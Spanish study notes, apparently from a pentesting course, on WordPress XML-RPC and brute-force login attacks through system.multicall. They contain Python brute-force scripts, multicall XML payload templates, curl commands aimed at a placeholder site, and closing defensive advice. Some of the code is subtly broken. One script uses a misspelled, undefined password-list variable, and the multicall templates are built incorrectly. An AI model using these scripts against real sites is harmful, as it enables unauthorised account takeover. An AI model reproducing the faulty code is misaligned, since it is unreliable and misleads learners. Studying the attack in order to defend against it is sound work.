---
tipo: teoria
tags: [ejptv2, el-hacker-legendario, python, pentesting]
actualizado: 2026-05-28
---

# Explicación XMLRPC en WordPress

XML-RPC en WordPress es un protocolo que permite la comunicación entre diferentes sistemas y plataformas de manera remota a través de XML (Extensible Markup Language) utilizando HTTP como transporte. Originalmente introducido en WordPress en 2002, XML-RPC facilita la interacción con tu sitio web desde aplicaciones externas, como clientes de escritorio, aplicaciones móviles y servicios web.

### Funcionamiento de XML-RPC en WordPress

1. **Activación y Funcionamiento Interno**:
    
    - XML-RPC está activado de forma predeterminada en WordPress. Sin embargo, desde la versión 5.0, hay discusiones sobre su desactivación debido a preocupaciones de seguridad.
2. **Endpoints y Métodos**:
    
    - WordPress proporciona endpoints predefinidos para interactuar con diferentes funcionalidades del sitio a través de XML-RPC. Algunos métodos comunes incluyen:
        - `wp.getPosts`: Para obtener publicaciones.
        - `wp.newPost`: Para crear una nueva publicación.
        - `wp.editPost`: Para editar una publicación existente.
        - `wp.getCategories`: Para obtener categorías.
        - `wp.uploadFile`: Para subir archivos al sitio.
3. **Autenticación y Seguridad**:
    
    - XML-RPC utiliza autenticación basada en cookies o mediante la inclusión de credenciales (usuario y contraseña) en las solicitudes. Es crucial manejar la autenticación de manera segura para evitar accesos no autorizados.
4. **Usos Comunes**:
    
    - **Publicación Remota**: Permite a los usuarios publicar y editar contenido en WordPress desde aplicaciones externas.
    - **Integración con Aplicaciones**: Facilita la integración de WordPress con sistemas de gestión de contenidos, aplicaciones móviles y servicios web de terceros.
    - **Automatización**: Se utiliza para automatizar tareas como la sincronización de contenido entre varios sitios o la gestión masiva de publicaciones.

### Configuración y Uso Práctico

Para interactuar con XML-RPC en WordPress, puedes utilizar bibliotecas y herramientas que manejen las solicitudes XML-RPC de manera eficiente, como `xmlrpc.client` en Python o bibliotecas específicas para tu lenguaje de programación preferido.

### Consideraciones de Seguridad

Debido a preocupaciones sobre la seguridad, es recomendable:

- **Desactivar si no es necesario**: Si no se utiliza XML-RPC, desactivarlo mediante plugins o configuración manual.
- **Limitar el acceso**: Restringir el acceso a través de reglas de firewall o plugins de seguridad.
- **Actualizar y Monitorear**: Mantener WordPress y sus plugins actualizados para mitigar vulnerabilidades conocidas.

En resumen, XML-RPC en WordPress es una poderosa herramienta para la integración y automatización, pero debe utilizarse con precaución para garantizar la seguridad y proteger la integridad del sitio. Si planeas desarrollar aplicaciones que interactúen con WordPress de manera remota, entender y implementar XML-RPC correctamente es fundamental para asegurar una integración robusta y segura.






---





## **Ataques de Fuerza Bruta en WordPress a través de XML-RPC**

XML-RPC es una de las interfaces más comunes en WordPress para interactuar con el sistema de manera remota, pero también es un objetivo atractivo para los atacantes debido a su vulnerabilidad a los ataques de fuerza bruta. En este artículo, exploraremos cómo funciona un ataque de fuerza bruta en WordPress a través de XML-RPC y cómo autenticarnos utilizando este archivo para realizar pruebas o auditorías de seguridad.

---

## **1. ¿Cómo funciona un ataque de fuerza bruta en XML-RPC?**

Un **ataque de fuerza bruta** en WordPress se basa en probar múltiples combinaciones de usuario y contraseña hasta encontrar las credenciales correctas. XML-RPC facilita este tipo de ataque debido a su método `system.multicall`, que permite enviar múltiples solicitudes en una sola petición.

### **Diferencias entre ataques en `/wp-login.php` y `xmlrpc.php`**

- **Ataque en `/wp-login.php`**: Se realiza un intento de inicio de sesión por cada solicitud HTTP, lo que hace que la velocidad del ataque dependa de la latencia de la conexión.
- **Ataque en `xmlrpc.php`**: Permite realizar múltiples intentos en una sola petición, lo que acelera significativamente el proceso de fuerza bruta.

---

## **2. Comprobando si XML-RPC está habilitado**

Antes de realizar un ataque o auditoría, es importante verificar si el archivo `xmlrpc.php` está accesible en el sitio web.

### **Método manual**

Puedes probar accediendo a la URL del archivo en el navegador:

```
https://ejemplo.com/xmlrpc.php
```

Si ves un mensaje como `XML-RPC server accepts POST requests only`, significa que XML-RPC está habilitado.

### **Usando cURL**

También puedes verificarlo con un comando cURL:

```bash
curl -X POST https://ejemplo.com/xmlrpc.php -d '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>usuario</string></value></param><param><value><string>contraseña</string></value></param></params></methodCall>'
```

Si XML-RPC está habilitado, recibirás una respuesta con el contenido del blog (o un error de autenticación si las credenciales son incorrectas).

---

## **3. Autenticación y prueba de credenciales en XML-RPC**

Para autenticarnos correctamente mediante `xmlrpc.php`, podemos utilizar herramientas como **Python** y la biblioteca `xmlrpc.client`.

### **Ejemplo de autenticación en Python**

```python
import xmlrpc.client

# URL del XML-RPC de WordPress
url = "https://ejemplo.com/xmlrpc.php"

# Usuario y contraseña
usuario = "admin"
contrasena = "password123"

# Cliente XML-RPC
wp = xmlrpc.client.ServerProxy(url)

try:
    # Intentamos obtener información del sitio para verificar autenticación
    blogs = wp.wp.getUsersBlogs(usuario, contrasena)
    print("Autenticación exitosa:", blogs)
except xmlrpc.client.Fault as error:
    print("Error en autenticación:", error)
```

Si las credenciales son correctas, el script devolverá información sobre el blog. Si son incorrectas, mostrará un error.

---

## **4. Ataque de Fuerza Bruta a XML-RPC**

Dado que `system.multicall` permite múltiples intentos en una sola petición, podemos explotar esto para hacer ataques de fuerza bruta de manera más eficiente.

### **Ejemplo de Fuerza Bruta en XML-RPC con Python**

```python
import xmlrpc.client

# URL del sitio WordPress con XML-RPC habilitado
url = "https://ejemplo.com/xmlrpc.php"

# Lista de usuarios y contraseñas (diccionario básico)
usuarios = ["admin", "user", "editor"]
contrasenas = ["123456", "password", "admin123", "qwerty"]

# Cliente XML-RPC
wp = xmlrpc.client.ServerProxy(url)

# Construimos el payload con múltiples intentos en una sola solicitud
def fuerza_bruta():
    multicall = xmlrpc.client.MultiCall(wp)
    for usuario in usuarios:
        for contrasena in contraseñas:
            multicall.wp.getUsersBlogs(usuario, contrasena)
    
    # Enviamos la solicitud
    resultados = multicall()
    for i, resultado in enumerate(resultados):
        if isinstance(resultado, list):
            print(f"[+] Credenciales válidas encontradas: {usuarios[i // len(contrasenas)]} - {contrasenas[i % len(contrasenas)]}")
            return
    print("[-] No se encontraron credenciales válidas.")

# Ejecutamos el ataque
fuerza_bruta()
```

Este script envía múltiples combinaciones en una sola solicitud, lo que lo hace mucho más rápido que los ataques tradicionales.

---

## **5. Protección contra Ataques de Fuerza Bruta en XML-RPC**

Dado que XML-RPC es un objetivo frecuente de ataques, es importante tomar medidas de seguridad.

### **Desactivar XML-RPC (si no es necesario)**

Si no usas XML-RPC, puedes desactivarlo añadiendo este código en `functions.php` de tu tema:

```php
add_filter('xmlrpc_enabled', '__return_false');
```

### **Bloquear el acceso mediante `.htaccess`**

Puedes bloquear el acceso directo a `xmlrpc.php` agregando esto en tu `.htaccess`:

```apache
<Files xmlrpc.php>
    Order Deny,Allow
    Deny from all
</Files>
```

### **Plugins de seguridad**

Si no quieres modificar archivos manualmente, puedes usar plugins como:

- **Wordfence Security**: Bloquea ataques de fuerza bruta.
- **Disable XML-RPC**: Desactiva completamente XML-RPC.

---

## **Conclusión**

XML-RPC en WordPress puede ser útil para integraciones y automatización, pero también representa un riesgo si no se protege adecuadamente. Los ataques de fuerza bruta pueden aprovechar `system.multicall` para probar múltiples credenciales rápidamente. Es fundamental auditar regularmente la seguridad de tu sitio y aplicar medidas de protección adecuadas.




---




## **Ataque de Fuerza Bruta en WordPress a Muy Alta Velocidad a través de XML-RPC**

Uno de los problemas de seguridad más graves en WordPress es el abuso del archivo `xmlrpc.php`, ya que permite realizar ataques de fuerza bruta a una **velocidad extremadamente alta** en comparación con otros métodos tradicionales, como los intentos en `/wp-login.php`.

Este artículo describe **cómo y por qué los ataques de fuerza bruta a través de XML-RPC son tan rápidos**, cómo llevar a cabo una prueba de concepto (PoC) y las mejores formas de **protegerse de este tipo de ataques**.

---

## **1. ¿Por qué XML-RPC permite ataques de fuerza bruta a alta velocidad?**

El punto clave es el método **`system.multicall`**, que permite enviar **múltiples intentos de inicio de sesión en una sola solicitud HTTP**.

### **Comparación de métodos de ataque:**

|Método|Intentos por solicitud|Velocidad del ataque|
|---|---|---|
|`/wp-login.php`|1 intento por solicitud|**Lento** (1 intento por cada request)|
|`xmlrpc.php` con `system.multicall`|**Cientos o miles de intentos en una sola solicitud**|**Extremadamente rápido** 🚀|

La diferencia es enorme. Mientras que en `/wp-login.php` cada intento de inicio de sesión requiere una solicitud HTTP independiente, en `xmlrpc.php` un solo request puede contener **cientos o incluso miles de intentos simultáneos**. Esto **reduce el tiempo del ataque de días a minutos**.

---

## **2. Comprobando si XML-RPC está habilitado**

Antes de realizar cualquier auditoría, lo primero es verificar si `xmlrpc.php` está disponible en el sitio objetivo.

### **Método manual**

Abre tu navegador y accede a:

```
https://ejemplo.com/xmlrpc.php
```

Si ves el mensaje `XML-RPC server accepts POST requests only`, significa que está habilitado.

### **Método con cURL**

```bash
curl -X POST https://ejemplo.com/xmlrpc.php -d '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>usuario</string></value></param><param><value><string>contraseña</string></value></param></params></methodCall>'
```

Si el archivo está activo, recibirás una respuesta (aunque las credenciales sean incorrectas).

---

## **3. Ataque de Fuerza Bruta a Alta Velocidad usando `system.multicall`**

Usaremos Python y `xmlrpc.client` para explotar `system.multicall` y realizar **miles de intentos en segundos**.

### **Código para un ataque de fuerza bruta súper rápido en XML-RPC**

```python
import xmlrpc.client

# URL del sitio objetivo con XML-RPC habilitado
url = "https://ejemplo.com/xmlrpc.php"

# Lista de usuarios y contraseñas comunes
usuarios = ["admin", "user", "editor"]
contrasenas = ["123456", "password", "admin123", "qwerty", "letmein", "welcome"]

# Cliente XML-RPC
wp = xmlrpc.client.ServerProxy(url)

# Función para realizar el ataque a alta velocidad
def fuerza_bruta():
    multicall = xmlrpc.client.MultiCall(wp)

    # Agregamos múltiples intentos en una sola petición
    for usuario in usuarios:
        for contrasena in contrasenas:
            multicall.wp.getUsersBlogs(usuario, contrasena)
    
    # Ejecutamos el ataque en una sola solicitud
    print("[+] Enviando petición con múltiples intentos...")
    resultados = multicall()

    # Revisamos los resultados
    for i, resultado in enumerate(resultados):
        if isinstance(resultado, list):  # Si la respuesta es válida, credenciales correctas
            print(f"[✅] Credenciales encontradas: {usuarios[i // len(contrasenas)]} - {contrasenas[i % len(contrasenas)]}")
            return

    print("[-] No se encontraron credenciales válidas.")

# Ejecutamos el ataque
fuerza_bruta()
```

---

## **4. ¿Por qué este ataque es tan rápido?**

1. **Múltiples intentos en una sola petición:**
    - Un solo request puede incluir **cientos o miles de combinaciones de usuario y contraseña**, eliminando la necesidad de enviar múltiples solicitudes HTTP.
2. **Menos restricciones de velocidad:**
    - Muchos firewalls y medidas anti-brute force están diseñados para limitar intentos de login en `/wp-login.php`, pero **ignoran completamente XML-RPC**.
3. **Menos consumo de ancho de banda y CPU en el atacante:**
    - Mientras que un ataque tradicional requiere enviar miles de peticiones, aquí solo se envía **una** petición con todos los intentos.

---

## **5. Protección contra ataques de fuerza bruta en XML-RPC**

### **1️⃣ Desactivar XML-RPC (la mejor opción)**

Si no usas XML-RPC, lo mejor es desactivarlo. Agrega esto en `functions.php`:

```php
add_filter('xmlrpc_enabled', '__return_false');
```

O usa `.htaccess`:

```apache
<Files xmlrpc.php>
    Order Deny,Allow
    Deny from all
</Files>
```

### **2️⃣ Limitar el acceso con un firewall**

Configura reglas en **Cloudflare, ModSecurity o Fail2Ban** para bloquear intentos sospechosos en `xmlrpc.php`.

### **3️⃣ Usar Plugins de Seguridad**

Algunos plugins que pueden ayudar a mitigar este ataque:

- **Wordfence Security** → Bloquea ataques de fuerza bruta.
- **Disable XML-RPC** → Desactiva completamente `xmlrpc.php`.
- **Limit Login Attempts Reloaded** → Limita intentos de autenticación.

---

## **6. Conclusión**

📌 **Los ataques de fuerza bruta en WordPress a través de XML-RPC son mucho más rápidos que los tradicionales.**  
📌 **`system.multicall` permite probar cientos de combinaciones en una sola petición, reduciendo drásticamente el tiempo de ataque.**  
📌 **Desactivar o proteger `xmlrpc.php` es esencial para evitar estos ataques.**

🚀 **Si eres un administrador de WordPress, revisa y protege tu sitio AHORA.**







----






## **Plantillas XML para Ataques de Fuerza Bruta en XML-RPC de WordPress**

Para explotar `xmlrpc.php` en WordPress, podemos enviar solicitudes XML personalizadas con múltiples combinaciones de usuario y contraseña en una sola petición. A continuación, te muestro plantillas XML para ataques de fuerza bruta utilizando `system.multicall`.

---

### **📌 1. Plantilla XML para probar una única combinación de usuario/contraseña**

Esta plantilla envía una solicitud de autenticación estándar a `xmlrpc.php` usando el método `wp.getUsersBlogs`.

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param>
      <value><string>admin</string></value>
    </param>
    <param>
      <value><string>password123</string></value>
    </param>
  </params>
</methodCall>
```

📌 **Uso:** Puedes guardarlo en un archivo `single_attempt.xml` y enviarlo con `cURL`:

```bash
curl -X POST -d @single_attempt.xml https://ejemplo.com/xmlrpc.php
```

---

### **🚀 2. Plantilla XML con `system.multicall` para múltiples intentos en una sola solicitud**

Esta plantilla permite enviar múltiples combinaciones de usuario y contraseña **en una sola petición HTTP**, acelerando drásticamente el ataque.

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value>
                          <array>
                            <data>
                              <value><string>admin</string></value>
                              <value><string>password123</string></value>
                            </data>
                          </array>
                        </value>
                        <value>
                          <array>
                            <data>
                              <value><string>admin</string></value>
                              <value><string>admin123</string></value>
                            </data>
                          </array>
                        </value>
                        <value>
                          <array>
                            <data>
                              <value><string>admin</string></value>
                              <value><string>qwerty</string></value>
                            </data>
                          </array>
                        </value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```

📌 **Explicación:**

- Este XML envía **tres intentos** de autenticación en una sola petición.
- Se pueden agregar más combinaciones simplemente duplicando las secciones `<value>...</value>` con diferentes usuarios y contraseñas.

📌 **Uso con cURL:**  
Guárdalo como `brute_force.xml` y ejecútalo con:

```bash
curl -X POST -d @brute_force.xml https://ejemplo.com/xmlrpc.php
```

---

### **🔥 3. Plantilla XML para probar múltiples usuarios con múltiples contraseñas**

Si no conoces el usuario exacto, esta plantilla prueba varias combinaciones de usuarios y contraseñas.

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value>
                          <array>
                            <data>
                              <value><string>admin</string></value>
                              <value><string>password</string></value>
                            </data>
                          </array>
                        </value>
                        <value>
                          <array>
                            <data>
                              <value><string>admin</string></value>
                              <value><string>123456</string></value>
                            </data>
                          </array>
                        </value>
                        <value>
                          <array>
                            <data>
                              <value><string>user</string></value>
                              <value><string>user123</string></value>
                            </data>
                          </array>
                        </value>
                        <value>
                          <array>
                            <data>
                              <value><string>editor</string></value>
                              <value><string>editorpass</string></value>
                            </data>
                          </array>
                        </value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>
```

📌 **Explicación:**

- Esta plantilla prueba **varios usuarios** (`admin`, `user`, `editor`) con **varias contraseñas** en una sola petición.
- Se pueden agregar más combinaciones fácilmente.

📌 **Uso:**  
Guárdalo como `multi_user_brute.xml` y envíalo con:

```bash
curl -X POST -d @multi_user_brute.xml https://ejemplo.com/xmlrpc.php
```

---

## **🚀 Ventajas de Usar XML-RPC para Fuerza Bruta**

✅ **Mucho más rápido** que los ataques a `/wp-login.php`.  
✅ **Evita algunas protecciones básicas** que limitan intentos en el login normal.  
✅ **Reduce consumo de ancho de banda** (menos peticiones).  
✅ **Puede pasar desapercibido** en algunos firewalls mal configurados.

---

## **🛡️ Cómo Defenderse de Estos Ataques**

Si eres administrador de WordPress, **debes protegerte contra estos ataques**. Aquí algunas soluciones:

🔴 **Desactivar XML-RPC si no lo necesitas:**

```php
add_filter('xmlrpc_enabled', '__return_false');
```

🔴 **Bloquear el acceso a `xmlrpc.php` con `.htaccess`:**

```apache
<Files xmlrpc.php>
    Order Deny,Allow
    Deny from all
</Files>
```

🔴 **Usar plugins de seguridad:**

- **Wordfence Security**
- **Disable XML-RPC**
- **Limit Login Attempts Reloaded**

---

## **📌 Conclusión**

Los ataques de fuerza bruta con `system.multicall` en XML-RPC **son extremadamente rápidos** y permiten probar cientos de combinaciones en una sola solicitud. **Si administras un WordPress, protege tu sitio YA**. 🚀

---

## Navegación

- ⬆️ Carpeta: [[_8- Interacción con Servicios Web|8- Interacción con Servicios Web]]
- ⬅️ Anterior: [[6- Inicio de Sesión en WordPress desde Python]]
- ➡️ Siguiente: [[8- Fuerza Bruta XMLRPC desde Python]]
